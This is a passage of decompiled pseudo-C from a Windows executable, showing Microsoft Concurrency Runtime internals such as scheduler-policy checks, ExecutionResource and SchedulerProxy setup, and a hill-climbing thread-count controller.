  return result;
}
// 13F1454C8: using guessed type __int64 __fastcall sub_13F1454C8(_QWORD, _QWORD);

//----- (000000013F150DD8) ----------------------------------------------------
__int64 __fastcall sub_13F150DD8(unsigned int a1)
{
  __int64 v1; // rax

  v1 = 10i64;
  if ( a1 <= 0xA )
    v1 = a1;
  return qword_13F1B7210[v1];
}
// 13F1B7210: using guessed type __int64 qword_13F1B7210[12];

//----- (000000013F150DF0) ----------------------------------------------------
char __fastcall sub_13F150DF0(int a1, unsigned int a2)
{
  char v2; // r9
  int v3; // ecx
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx

  v2 = 1;
  if ( a1 > 5 )
  {
    v5 = a1 - 6;
    if ( !v5 )
    {
      if ( a2 + 15 > 0x1E )
        return a2 == 61440;
      v8 = 1077935873;
      if ( !_bittest(&v8, a2 + 15) )
        return a2 == 61440;
      return v2;
    }
    v6 = v5 - 1;
    if ( v6 )
    {
      v7 = v6 - 1;
      if ( v7 )
      {
        if ( v7 != 1 )
LABEL_24:
          sub_13F16A158();
      }
    }
    if ( a2 < 2 )
      return v2;
    return 0;
  }
  if ( a1 >= 4 )
    return a2 <= 0x7FFFFFFF;
  if ( !a1 )
    return a2 == 0;
  v3 = a1 - 1;
  if ( !v3 )
  {
    if ( a2 )
    {
LABEL_10:
      if ( a2 + 0x80000000 <= 0x7FFFFFFE )
        return 0;
      return v2;
    }
    return 0;
  }
  v4 = v3 - 1;
  if ( !v4 )
    goto LABEL_10;
  if ( v4 != 1 )
    goto LABEL_24;
  if ( a2 - 1 > 0x7FFFFFFE )
    return 0;
  return v2;
}

//----- (000000013F150E9C) ----------------------------------------------------
__int64 __fastcall sub_13F150E9C(__int64 *a1)
{
  __int64 result; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  result = *a1;
  if ( !*(_DWORD *)(*a1 + 8) )
  {
    v2 = sub_13F150DD8(2u);
    sub_13F142DC4(pExceptionObject, v2);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_value_Concurrency__);
  }
  if ( !*(_DWORD *)(result + 32) )
  {
    v3 = sub_13F150DD8(8u);
    sub_13F142DC4(pExceptionObject, v3);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_value_Concurrency__);
  }
  return result;
}
// 13F150E9C: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F150F08) ----------------------------------------------------
__int64 __fastcall sub_13F150F08(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  __int64 result; // rax

  *(_QWORD *)a1 = &Concurrency::details::ExecutionResource::`vftable';
  *(_DWORD *)(a1 + 8) = 0;
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_WORD *)(a1 + 24) = 0;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)(a1 + 32) = a2;
  *(_QWORD *)(a1 + 40) = 0i64;
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_QWORD *)(a1 + 56) = 0i64;
  *(_DWORD *)(a1 + 64) = *(_DWORD *)(a3 + 20);
  *(_DWORD *)(a1 + 76) = 0;
  *(_DWORD *)(a1 + 68) = a4;
  result = a1;
  *(_DWORD *)(a1 + 72) = (*(_DWORD *)(a3 + 16) << 8) + *(unsigned __int8 *)(*(_QWORD *)(a3 + 56) + 72i64 * a4 + 8);
  return result;
}
// 13F18B020: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (000000013F150F6C) ----------------------------------------------------
__int64 __fastcall sub_13F150F6C(__int64 a1, __int64 a2, _DWORD *a3)
{
  *(_QWORD *)a1 = &Concurrency::details::ExecutionResource::`vftable';
  *(_DWORD *)(a1 + 8) = 0;
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_WORD *)(a1 + 24) = 0;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)(a1 + 32) = a2;
  *(_QWORD *)(a1 + 40) = a3;
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_QWORD *)(a1 + 56) = 0i64;
  *(_DWORD *)(a1 + 64) = a3[16];
  *(_DWORD *)(a1 + 68) = a3[17];
  *(_DWORD *)(a1 + 76) = 0;
  *(_DWORD *)(a1 + 72) = a3[18];
  return a1;
}
// 13F18B020: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (000000013F150FD0) ----------------------------------------------------
void __fastcall sub_13F150FD0(__int64 a1)
{
  __int64 v3; // rdi
  __int64 v4; // rcx
  __int64 v5; // rax

  if ( (*(_DWORD *)(a1 + 76))-- == 1 )
  {
    v3 = *(_QWORD *)(a1 + 48);
    sub_13F1511FC(a1);
    v4 = *(_QWORD *)(a1 + 40);
    if ( v4 )
    {
      sub_13F150FD0(v4);
      sub_13F152DE0(*(_QWORD *)(a1 + 32), (_QWORD *)a1);
    }
    else
    {
      sub_13F15235C(*(_QWORD *)(a1 + 32), *(_DWORD *)(a1 + 64), *(_DWORD *)(a1 + 68), v3 == 0);
      if ( !v3 )
      {
        v5 = MEMORY[0x76F833C0]();
        sub_13F143410((_QWORD *)(a1 + 16), v5);
        sub_13F152304(*(_QWORD *)(a1 + 32), a1);
        sub_13F152430(*(_QWORD *)(a1 + 32), a1);
      }
    }
  }
}

//----- (000000013F15105C) ----------------------------------------------------
__int64 __fastcall sub_13F15105C(__int64 a1)
{
  return *(unsigned int *)(a1 + 72);
}

//----- (000000013F151060) ----------------------------------------------------
__int64 __fastcall sub_13F151060(__int64 a1)
{
  return *(unsigned int *)(a1 + 64);
}

//----- (000000013F151064) ----------------------------------------------------
__int64 __fastcall sub_13F151064(__int64 a1)
{
  int v2; // ecx
  __int64 result; // rax
  __int64 v4; // rbx
  __int64 v5; // rcx
  __int64 v6; // rbx
  _QWORD *v7; // rax
  unsigned __int64 v8; // rdx
  __int64 v9; // rcx
  __int64 v10; // r8
  __int64 v11[2]; // [rsp+20h] [rbp-38h] BYREF
  __int64 v12; // [rsp+30h] [rbp-28h] BYREF

  v2 = *(_DWORD *)(a1 + 76);
  result = (unsigned int)(v2 + 1);
  *(_DWORD *)(a1 + 76) = result;
  if ( !v2 )
  {
    v4 = *(_QWORD *)(a1 + 48);
    v5 = *(_QWORD *)(a1 + 32);
    if ( *(_QWORD *)(a1 + 40) )
    {
      sub_13F151DF0(v5, a1);
    }
    else
    {
      sub_13F152B64(v5, *(_DWORD *)(a1 + 64), *(_DWORD *)(a1 + 68), v4 == 0);
      if ( !v4 )
      {
        v6 = MEMORY[0x76F833C0]();
        v7 = sub_13F142EFC(&v12, v6);
        *(_WORD *)(a1 + 24) = *((_WORD *)v7 + 4);
        *(_QWORD *)(a1 + 16) = *v7;
        v8 = (unsigned __int64)*(unsigned int *)(a1 + 64) << 6;
        v9 = *(_QWORD *)(*(_QWORD *)(a1 + 32) + 32i64);
        v10 = *(_QWORD *)(v8 + v9);
        v11[1] = *(unsigned __int16 *)(v8 + v9 + 16);
        v11[0] = v10;
        sub_13F143410(v11, v6);
        sub_13F152B08(*(_QWORD *)(a1 + 32), a1);
        sub_13F151D50(*(_QWORD *)(a1 + 32), a1);
      }
    }
    return sub_13F151228(a1);
  }
  return result;
}

//----- (000000013F15115C) ----------------------------------------------------
__int64 __fastcall sub_13F15115C(__int64 a1, __int64 a2)
{
  __int64 v4; // rcx
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( !a2 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"pScheduler");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( sub_13F152618(*(_QWORD *)(a1 + 32)) != a1 )
  {
    sub_13F143088(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  v4 = *(_QWORD *)(a1 + 32);
  if ( *(_QWORD *)(v4 + 16) != a2 )
  {
    sub_13F143088(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  return sub_13F146CD8(*(_QWORD *)(v4 + 24), a1);
}
// 13F15115C: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F1511FC) ----------------------------------------------------
__int64 __fastcall sub_13F1511FC(__int64 a1)
{
  __int64 result; // rax

  result = sub_13F142820();
  *(_QWORD *)(a1 + 56) = 0i64;
  return result;
}

//----- (000000013F151228) ----------------------------------------------------
__int64 __fastcall sub_13F151228(__int64 a1)
{
  *(_QWORD *)(a1 + 56) = sub_13F142818(*(unsigned int *)(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 24i64) + 176i64));
  return sub_13F142820();
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);

//----- (000000013F151264) ----------------------------------------------------
double __fastcall sub_13F151264(double a1)
{
  int v2; // eax

  if ( a1 == 0.0 )
    return 0.0;
  v2 = -1;
  if ( a1 > 0.0 )
    return (double)1;
  return (double)v2;
}

//----- (000000013F15128C) ----------------------------------------------------
__int64 __fastcall sub_13F15128C(__int64 a1, int a2, int a3, __int64 a4)
{
  __int64 v4; // r10
  __int64 v5; // rax
  __int64 result; // rax

  v4 = 64i64;
  v5 = a1 + 8;
  do
  {
    *(_QWORD *)(v5 + 8) = 0i64;
    *(_QWORD *)(v5 - 8) = 0i64;
    *(_QWORD *)v5 = 0i64;
    *(_DWORD *)(v5 + 16) = 0;
    v5 += 32i64;
    --v4;
  }
  while ( v4 );
  *(_QWORD *)(a1 + 2048) = a4;
  *(_QWORD *)(a1 + 2068) = 0i64;
  *(_DWORD *)(a1 + 2076) = a2;
  *(_QWORD *)(a1 + 2080) = 0i64;
  result = a1;
  *(_QWORD *)(a1 + 2088) = 0i64;
  *(_DWORD *)(a1 + 2096) = 0;
  *(_BYTE *)(a1 + 2100) = 1;
  *(_DWORD *)(a1 + 2064) = a3;
  *(double *)(a1 + 2056) = (double)a3;
  return result;
}

//----- (000000013F151300) ----------------------------------------------------
double __fastcall sub_13F151300(__int64 a1, int a2, int a3)
{
  __int64 v4; // rcx
  __int64 v5; // rbx
  int v6; // eax
  int v7; // edi
  double v8; // xmm6_8
  double v9; // xmm1_8
  double v10; // xmm8_8
  double v11; // xmm7_8
  double v12; // xmm7_8
  double v13; // xmm9_8
  double v14; // xmm10_8
  double v15; // xmm0_8

  v4 = a1 + 32i64 * (a2 & 0x3F);
  if ( *(_DWORD *)(v4 + 20) != a2 )
  {
    *(_DWORD *)(v4 + 16) = 0;
    *(_QWORD *)v4 = 0i64;
    *(_QWORD *)(v4 + 8) = 0i64;
    *(_DWORD *)(v4 + 20) = a2;
    *(_DWORD *)(v4 + 24) = 0;
  }
  v5 = a1 + 32i64 * (a3 & 0x3F);
  if ( *(_DWORD *)(v5 + 20) == a3 )
  {
    v6 = *(_DWORD *)(v5 + 16);
  }
  else
  {
    *(_DWORD *)(v5 + 16) = 0;
    v6 = 0;
    *(_QWORD *)v5 = 0i64;
    *(_QWORD *)(v5 + 8) = 0i64;
    *(_DWORD *)(v5 + 20) = a3;
    *(_DWORD *)(v5 + 24) = 0;
  }
  v7 = *(_DWORD *)(v4 + 16);
  v8 = 0.0;
  if ( v7 )
    v9 = *(double *)v4 / (double)v7;
  else
    v9 = 0.0;
  v10 = (double)v6;
  if ( v6 )
    v11 = *(double *)v5 / v10;
  else
    v11 = 0.0;
  v12 = v11 - v9;
  v13 = v12 / v9 / ((double)(a3 - a2) / (double)a2) - 0.15;
  v14 = *(double *)sub_13F15190C(v4).m128_u64 / (double)v7;
  if ( fabs(v12) > 0.0 )
  {
    v15 = *(double *)sub_13F15190C(v5).m128_u64;
    v8 = fabs(sub_13F16DC78(v15 / v10 + v14) / v12);
  }
  return sub_13F16D880(v8 * -1.0) * v13;
}

//----- (000000013F151470) ----------------------------------------------------
__m128 __fastcall sub_13F151470(__int64 a1)
{
  __m128 v2; // xmm0
  __m128 v3; // xmm7
  double v4; // xmm6_8
  double v5; // xmm0_8

  v2 = sub_13F15190C(a1);
  *(double *)v2.m128_u64 = sub_13F16DC78(*(double *)v2.m128_u64);
  v3 = v2;
  if ( *(_DWORD *)(a1 + 16) )
  {
    v5 = (double)*(int *)(a1 + 16);
    v4 = *(double *)a1 / v5;
  }
  else
  {
    v4 = 0.0;
    v5 = 0.0;
  }
  *(double *)v3.m128_u64 = *(double *)v3.m128_u64 / sub_13F16DC78(v5) / v4;
  return v3;
}

//----- (000000013F1514D0) ----------------------------------------------------
__int64 __fastcall sub_13F1514D0(_DWORD *a1, int a2)
{
  __int64 result; // rax
  __int64 v3; // rax

  result = (unsigned int)a1[517];
  if ( a2 != (_DWORD)result )
  {
    a1[518] = result;
    a1[517] = a2;
    v3 = 8i64 * (a2 & 0x3F);
    *(_QWORD *)&a1[v3 + 4] = 0i64;
    *(_QWORD *)&a1[v3] = 0i64;
    *(_QWORD *)&a1[v3 + 2] = 0i64;
    a1[v3 + 6] = 0;
    return sub_13F151514(a1);
  }
  return result;
}

//----- (000000013F151514) ----------------------------------------------------
__int64 __fastcall sub_13F151514(_DWORD *a1)
{
  unsigned int *v1; // rdx
  __int64 v2; // r8
  __int64 result; // rax

  v1 = a1 + 5;
  v2 = 64i64;
  do
  {
    result = *v1;
    if ( (_DWORD)result != a1[517] && (_DWORD)result != a1[518] )
    {
      result = a1[521] - v1[1];
      if ( (unsigned int)result > 0x32 )
      {
        *(_QWORD *)(v1 - 1) = 0i64;
        *(_QWORD *)(v1 - 5) = 0i64;
        *(_QWORD *)(v1 - 3) = 0i64;
        v1[1] = 0;
      }
    }
    v1 += 8;
    --v2;
  }
  while ( v2 );
  return result;
}

//----- (000000013F15155C) ----------------------------------------------------
bool __fastcall sub_13F15155C(__int64 a1, __int64 a2)
{
  return *(_DWORD *)(a2 + 16) > 5u || *(_DWORD *)(a2 + 16) >= 3u && fabs(*(double *)sub_13F151470(a2).m128_u64) <= 0.004;
}

//----- (000000013F151590) ----------------------------------------------------
__int64 __fastcall sub_13F151590(__int64 a1, unsigned int a2)
{
  _DWORD *v2; // r8
  int v5; // edx
  unsigned int v6; // edi
  unsigned int v7; // er9
  unsigned int v8; // ecx
  unsigned int v9; // er9
  unsigned int v10; // edx
  unsigned int v11; // ecx
  int i; // edi
  __int64 v13; // rax

  v2 = *(_DWORD **)(a1 + 2048);
  v5 = v2[58];
  v6 = *(_DWORD *)(a1 + 2068);
  v7 = v2[55] - v5;
  if ( v7 <= v2[45] )
    v7 = v2[45];
  v8 = v5 + v2[44];
  v9 = v5 + v7;
  v10 = v2[59];
  if ( v10 >= v8 )
    v10 = v8;
  v11 = *(_DWORD *)(a1 + 2064);
  if ( v11 + v6 < a2 )
    a2 = v11 + v6;
  if ( v6 > v11 && v6 - v11 > a2 )
    a2 = v6 - v11;
  if ( a2 == v6 )
  {
    if ( a2 <= v9 )
      ++a2;
    else
      --a2;
  }
  if ( v9 > a2 )
    a2 = v9;
  if ( v10 < a2 )
    a2 = v10;
  if ( a2 != v6 && a2 == v6 )
  {
    for ( i = v6 - 1; i == a2 || a2 != i && a2 == i; --i )
    {
      v13 = 32i64 * (i & 0x3F);
      if ( *(_DWORD *)(v13 + a1 + 20) != i )
      {
        *(_DWORD *)(v13 + a1 + 16) = 0;
        *(_QWORD *)(v13 + a1) = 0i64;
        *(_QWORD *)(v13 + a1 + 8) = 0i64;
        *(_DWORD *)(v13 + a1 + 24) = 0;
        *(_DWORD *)(v13 + a1 + 20) = i;
      }
      if ( *(int *)(v13 + a1 + 16) > 0 && sub_13F151300(a1, *(_DWORD *)(a1 + 2068), i) * -1.0 <= 0.0 )
        return (unsigned int)(i + 1);
    }
  }
  return a2;
}

//----- (000000013F1516B0) ----------------------------------------------------
__int64 __fastcall sub_13F1516B0(__int64 a1, unsigned int a2, unsigned int a3, int a4, unsigned int a5)
{
  int v10; // edx
  unsigned int v11; // eax
  int v12; // eax
  _DWORD *v13; // rax
  unsigned int v14; // edx
  int v15; // ecx
  int v16; // er8
  unsigned int v17; // eax
  unsigned int v18; // er8
  unsigned int v19; // er8
  unsigned int v20; // esi
  double v21; // xmm1_8
  __int64 v22; // rdx
  int v23; // er8
  __int64 v24; // rcx
  int v25; // eax
  double v26; // xmm0_8
  double v27; // xmm0_8
  int v28; // eax
  double v29; // xmm0_8
  int v30; // ecx
  unsigned int v31; // edx

  if ( !a2 )
    return 0i64;
  ++*(_DWORD *)(a1 + 2084);
  sub_13F1514D0((_DWORD *)a1, a2);
  v10 = *(_DWORD *)(a1 + 2088);
  if ( v10 )
  {
    a3 += *(_DWORD *)(a1 + 2092);
    a4 += *(_DWORD *)(a1 + 2096);
  }
  if ( a3 < a2 && a3 < a5 )
  {
    v11 = a2 - a3;
    a3 = a2;
    a4 += v11;
  }
  v12 = *(_DWORD *)(a1 + 2080);
  if ( !v12 || a3 || a4 || a5 )
  {
    v20 = *(_DWORD *)(a1 + 2068);
    *(_QWORD *)(a1 + 2092) = 0i64;
    *(_DWORD *)(a1 + 2080) = v12 + 1;
    *(_DWORD *)(a1 + 2088) = 0;
    v21 = (double)(int)a3 * 10.0 / (double)(v10 + 1);
    if ( (unsigned int)(v12 + 1) <= 1 )
    {
      *(_DWORD *)(a1 + 2072) = v20;
      return v20;
    }
    v22 = a1 + 32i64 * (v20 & 0x3F);
    if ( *(_DWORD *)(v22 + 20) != v20 )
    {
      *(_DWORD *)(v22 + 16) = 0;
      *(_QWORD *)v22 = 0i64;
      *(_QWORD *)(v22 + 8) = 0i64;
      *(_DWORD *)(v22 + 20) = v20;
      *(_DWORD *)(v22 + 24) = 0;
    }
    v23 = *(_DWORD *)(a1 + 2072);
    v24 = a1 + 32i64 * (v23 & 0x3F);
    if ( *(_DWORD *)(v24 + 20) != v23 )
    {
      *(_DWORD *)(v24 + 16) = 0;
      *(_QWORD *)v24 = 0i64;
      *(_QWORD *)(v24 + 8) = 0i64;
      *(_DWORD *)(v24 + 20) = v23;
      *(_DWORD *)(v24 + 24) = 0;
    }
    v25 = *(_DWORD *)(a1 + 2084);
    v26 = v21 + *(double *)v22;
    ++*(_DWORD *)(v22 + 16);
    *(_DWORD *)(v22 + 24) = v25;
    *(double *)v22 = v26;
    *(double *)(v22 + 8) = v21 * v21 + *(double *)(v22 + 8);
    if ( !*(_DWORD *)(v24 + 16) || v22 == v24 )
    {
      if ( !sub_13F15155C(a1, v22) )
        return v20;
      v31 = (*(_BYTE *)(a1 + 2100) != 0) + *(_DWORD *)(a1 + 2068);
      *(_BYTE *)(a1 + 2100) = *(_BYTE *)(a1 + 2100) == 0;
    }
    else
    {
      if ( !sub_13F15155C(a1, v22) )
        return v20;
      v27 = sub_13F151300(a1, *(_DWORD *)(a1 + 2072), *(_DWORD *)(a1 + 2068));
      v28 = *(_DWORD *)(a1 + 2068);
      v29 = v27 * *(double *)(a1 + 2056);
      v30 = (int)((double)v28 + v29);
      if ( v30 == v28 )
        v30 = (int)(sub_13F151264(v29) + (double)v28);
      v31 = v30;
    }
    return (unsigned int)sub_13F151590(a1, v31);
  }
  v13 = *(_DWORD **)(a1 + 2048);
  v14 = v10 + 1;
  *(_DWORD *)(a1 + 2088) = v14;
  *(_DWORD *)(a1 + 2092) = 0;
  *(_DWORD *)(a1 + 2096) = 0;
  v15 = v13[58];
  v16 = v13[55];
  v17 = v13[45];
  v18 = v16 - v15;
  if ( v18 <= v17 )
    v18 = v17;
  v19 = v15 + v18;
  if ( v14 < 3 )
    return *(unsigned int *)(a1 + 2068);
  return v19;
}

//----- (000000013F15190C) ----------------------------------------------------
__m128 __fastcall sub_13F15190C(__int64 a1)
{
  int v1; // eax
  __int128 v2; // xmm2

  v1 = *(_DWORD *)(a1 + 16);
  v2 = 0i64;
  if ( v1 >= 2 )
  {
    v2 = *(unsigned __int64 *)(a1 + 8);
    *(double *)&v2 = (*(double *)(a1 + 8) - *(double *)a1 * *(double *)a1 / (double)v1) / (double)(v1 - 1);
  }
  if ( fabs(*(double *)&v2) <= 0.0001 )
    return (__m128)0i64;
  return (__m128)v2;
}

//----- (000000013F151960) ----------------------------------------------------
__int64 __fastcall sub_13F151960(__int64 a1, __int64 a2, __int64 a3, _QWORD *a4)
{
  unsigned int v7; // ebp
  __int64 v8; // rcx
  __int64 v9; // rax
  unsigned int v10; // ebx
  unsigned int v11; // ecx
  unsigned int v12; // er10
  unsigned int v13; // eax
  unsigned int v14; // er8
  unsigned int v15; // eax
  unsigned int v16; // er9
  int v17; // ecx
  int v18; // er8
  unsigned int v19; // ecx
  unsigned int v20; // eax
  __int64 v21; // rcx
  __int64 v22; // rax
  __int64 v23; // rax
  unsigned int v24; // eax
  unsigned __int128 v25; // rax
  unsigned __int64 v26; // kr00_8

  *(_QWORD *)a1 = &Concurrency::details::SchedulerProxy::`vftable';
  v7 = 0;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 24) = a3;
  sub_13F1416E8(a1 + 64);
  *(_QWORD *)(a1 + 104) = 0i64;
  *(_DWORD *)(a1 + 168) = 0;
  *(_QWORD *)(a1 + 204) = 0i64;
  *(_QWORD *)(a1 + 216) = 0i64;
  *(_QWORD *)(a1 + 224) = 0i64;
  *(_DWORD *)(a1 + 232) = 0;
  *(_DWORD *)(a1 + 248) = 0;
  *(_QWORD *)(a1 + 256) = 0i64;
  *(_QWORD *)(a1 + 16) = a2;
  *(_DWORD *)(a1 + 188) = sub_13F150BEC(a4, 1u);
  *(_DWORD *)(a1 + 184) = sub_13F150BEC(a4, 2u);
  *(_DWORD *)(a1 + 192) = sub_13F150BEC(a4, 3u);
  *(_DWORD *)(a1 + 196) = sub_13F150BEC(a4, 5u);
  *(_DWORD *)(a1 + 200) = sub_13F150BEC(a4, 6u);
  *(_BYTE *)(a1 + 264) = (unsigned int)sub_13F150BEC(a4, 8u) == 1;
  if ( *(_DWORD *)(a1 + 200) == 61440 )
  {
    v9 = MEMORY[0x76F833C0](v8);
    *(_DWORD *)(a1 + 200) = (char)sub_13F1426A0(v9);
  }
  *(_DWORD *)(a1 + 172) = (***(__int64 (__fastcall ****)(_QWORD))(a1 + 16))(*(_QWORD *)(a1 + 16));
  v10 = sub_13F1451B0();
  *(_DWORD *)(a1 + 236) = v10;
  v11 = *(_DWORD *)(a1 + 192);
  v12 = *(_DWORD *)(a1 + 188);
  v13 = (v10 + v12 - 1) / v10;
  if ( v11 >= v13 )
  {
    v14 = (v12 + v11 - 1) / v11;
    *(_DWORD *)(a1 + 176) = v14;
  }
  else
  {
    *(_DWORD *)(a1 + 192) = v13;
    *(_DWORD *)(a1 + 176) = v10;
    v14 = v10;
  }
  if ( v12 % v14 )
  {
    v16 = (v14 + v12 - 1) / v14;
    *(_DWORD *)(a1 + 192) = v16;
    v17 = v12 + v14 * (1 - v16);
    *(_DWORD *)(a1 + 212) = v17;
    v18 = v14 - v17;
    v19 = v18 * (v16 - 1);
    v20 = *(_DWORD *)(a1 + 184);
    if ( v19 < v20 )
      v15 = v18 + (v16 + v20 - v19 - 1) / v16;
    else
      v15 = (v16 + v20 - 2) / (v16 - 1);
  }
  else
  {
    *(_DWORD *)(a1 + 192) = v12 / v14;
    *(_DWORD *)(a1 + 212) = v14;
    v15 = (v12 / v14 + *(_DWORD *)(a1 + 184) - 1) / (v12 / v14);
  }
  *(_DWORD *)(a1 + 180) = v15;
  sub_13F1469A0(*(_QWORD *)(a1 + 24));
  if ( *(_BYTE *)(a1 + 264) )
  {
    v22 = sub_13F14059C(2104i64);
    if ( v22 )
      v23 = sub_13F15128C(v22, *(_DWORD *)(a1 + 172), v10, a1);
    else
      v23 = 0i64;
    *(_QWORD *)(a1 + 104) = v23;
  }
  v24 = sub_13F1454D0(v21);
  *(_DWORD *)(a1 + 240) = v24;
  *(_QWORD *)(a1 + 32) = 0i64;
  v26 = v24;
  v25 = v24 * (unsigned __int128)4ui64;
  if ( !is_mul_ok(v26, 4ui64) )
    *(_QWORD *)&v25 = -1i64;
  *(_QWORD *)(a1 + 40) = sub_13F1790C4(v25, *((_QWORD *)&v25 + 1));
  if ( *(_DWORD *)(a1 + 240) )
  {
    do
    {
      *(_DWORD *)(*(_QWORD *)(a1 + 40) + 4i64 * v7) = v7;
      ++v7;
    }
    while ( v7 < *(_DWORD *)(a1 + 240) );
  }
  return a1;
}
// 13F151A4F: variable 'v8' is possibly undefined
// 13F151B9A: variable 'v21' is possibly undefined
// 13F1426A0: using guessed type __int64 __fastcall sub_13F1426A0(_QWORD);
// 13F1454D0: using guessed type __int64 __fastcall sub_13F1454D0(_QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18B250: using guessed type void *Concurrency::details::SchedulerProxy::`vftable';

//----- (000000013F151BF8) ----------------------------------------------------
__int64 __fastcall sub_13F151BF8(_QWORD *a1)
{
  __int64 v2; // rdx

  *a1 = &Concurrency::details::SchedulerProxy::`vftable';
  sub_13F143AE4(a1[3], a1[4]);
  sub_13F14088C(a1[5], v2);
  sub_13F146A14(a1[3]);
  return sub_13F1417C0(a1 + 8);
}
// 13F151C26: variable 'v2' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1417C0: using guessed type __int64 __fastcall sub_13F1417C0(_QWORD);
// 13F18B250: using guessed type void *Concurrency::details::SchedulerProxy::`vftable';

//----- (000000013F151C44) ----------------------------------------------------
char *__fastcall sub_13F151C44(_DWORD *a1, __int64 a2, unsigned int a3, char a4)
{
  int v4; // eax
  unsigned int v6; // edi
  __int64 v9; // rcx
  __int64 v10; // rax
  __int64 v11; // r14
  char *v12; // rsi
  unsigned __int128 v13; // rax
  char *v14; // r12
  __int64 v15; // rdx
  char *result; // rax
  char v17[40]; // [rsp+20h] [rbp-28h] BYREF

  v4 = a1[53];
  v6 = a1[48];
  if ( v4 )
    a1[53] = v4 - 1;
  else
    --v6;
  ++*(_DWORD *)(a2 + 36);
  ++a1[52];
  v9 = 9i64 * a3;
  v10 = *(_QWORD *)(a2 + 56);
  *(_DWORD *)(v10 + 8 * v9) = 4;
  *(_DWORD *)(v10 + 8 * v9 + 52) = v6;
  a1[56] += v6;
  if ( a4 )
    sub_13F152F78((__int64)a1, a2, a3);
  v11 = v6;
  if ( v6 == 1 )
  {
    v12 = v17;
LABEL_11:
    v14 = v12;
    do
    {
      *(_QWORD *)v14 = (*(__int64 (__fastcall **)(_DWORD *, __int64, _QWORD))(*(_QWORD *)a1 + 48i64))(a1, a2, a3);
      v14 += 8;
      --v11;
    }
    while ( v11 );
    goto LABEL_13;
  }
  v13 = v6 * (unsigned __int128)8ui64;
  if ( !is_mul_ok(v6, 8ui64) )
    *(_QWORD *)&v13 = -1i64;
  v12 = (char *)sub_13F1790C4(v13, *((_QWORD *)&v13 + 1));
  if ( v6 )
    goto LABEL_11;
LABEL_13:
  sub_13F151E48((__int64)a1, v12, v6);
  result = v17;
  if ( v12 != v17 )
    return (char *)sub_13F14088C(v12, v15);
  return result;
}
// 13F151D2C: variable 'v15' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F151D50) ----------------------------------------------------
__int64 __fastcall sub_13F151D50(__int64 a1, __int64 a2)
{
  __int64 v4; // rdx
  __int64 v5; // r9
  __int64 v6; // rax

  sub_13F1419D8(a1 + 64);
  v4 = 9i64 * *(unsigned int *)(a2 + 68);
  v5 = *(_QWORD *)(((unsigned __int64)*(unsigned int *)(a2 + 64) << 6) + *(_QWORD *)(a1 + 32) + 56);
  v6 = *(_QWORD *)(v5 + 72i64 * *(unsigned int *)(a2 + 68) + 24);
  if ( v6 )
  {
    *(_QWORD *)(a2 + 88) = *(_QWORD *)(v6 + 88);
    *(_QWORD *)(a2 + 80) = *(_QWORD *)(v5 + 8 * v4 + 24);
    *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(v5 + 8 * v4 + 24) + 88i64) + 80i64) = a2;
    *(_QWORD *)(*(_QWORD *)(v5 + 8 * v4 + 24) + 88i64) = a2;
  }
  else
  {
    *(_QWORD *)(a2 + 88) = a2;
    *(_QWORD *)(a2 + 80) = a2;
  }
  *(_QWORD *)(v5 + 8 * v4 + 24) = a2;
  ++*(_DWORD *)(v5 + 8 * v4 + 16);
  return sub_13F141BDC(a1 + 64);
}
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);

//----- (000000013F151DF0) ----------------------------------------------------
__int64 __fastcall sub_13F151DF0(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  result = *(_QWORD *)(a1 + 256);
  if ( result )
  {
    *(_QWORD *)(a2 + 88) = *(_QWORD *)(result + 88);
    *(_QWORD *)(a2 + 80) = *(_QWORD *)(a1 + 256);
    *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 256) + 88i64) + 80i64) = a2;
    result = *(_QWORD *)(a1 + 256);
    *(_QWORD *)(result + 88) = a2;
  }
  else
  {
    *(_QWORD *)(a2 + 88) = a2;
    *(_QWORD *)(a2 + 80) = a2;
  }
  ++*(_DWORD *)(a1 + 248);
  *(_QWORD *)(a1 + 256) = a2;
  return result;
}

//----- (000000013F151E48) ----------------------------------------------------
__int64 __fastcall sub_13F151E48(__int64 a1, _QWORD *a2, unsigned int a3)
{
